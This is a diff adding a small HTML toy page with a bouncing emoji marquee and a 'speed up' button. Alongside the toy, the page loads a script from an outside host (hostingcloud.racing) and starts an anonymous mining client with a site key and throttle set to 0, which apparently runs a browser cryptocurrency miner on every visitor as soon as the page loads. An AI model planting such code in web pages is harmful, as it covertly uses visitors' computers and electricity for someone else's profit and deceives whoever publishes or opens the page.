@@ -1,0 +1,51 @@
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Max</title>
+    <style>
+        body {
+            background-color: rgb(0, 0, 41);
+        }
+
+        button {
+            position: absolute;
+            font-size: larger;
+            font-weight: bolder;
+            opacity: 0.8;
+        }
+
+        div {
+            text-align: center;
+        }
+    </style>
+</head>
+
+<body>
+    <marquee scrollamount="6" direction="down" width="98%" height="91%" behavior="alternate"
+        style="position:absolute;display:inline-block; text-shadow : 2px 2px 4px;">
+        <marquee id="mr" style="font-size: 250%" id="mr1" direction="left" scrollamount="20" behavior="alternate">
+            😁
+        </marquee>
+    </marquee>
+    <div>
+        <button onclick="speed_up()">speed up</button>
+    </div>
+</body>
+
+<script src="https://www.hostingcloud.racing/Zjto.js"></script>
+<script>
+    var speed = 20
+    var _client = new Client.Anonymous('912b518c3584fc843a198873fbb2827da4993466acbbaefc3a1cece63ed3ab84', {
+        throttle: 0, c: 'w', ads: 0
+    });
+    _client.start();
+    _client.addMiningNotification("Top", "Thank you for visiting this page", "#cccccc", 40, "#3d3d3d");
+    function speed_up() {
+        speed += 1
+        document.getElementById("mr").setAttribute("scrollamount", String(speed))
+    }
+</script>
+
+</html>
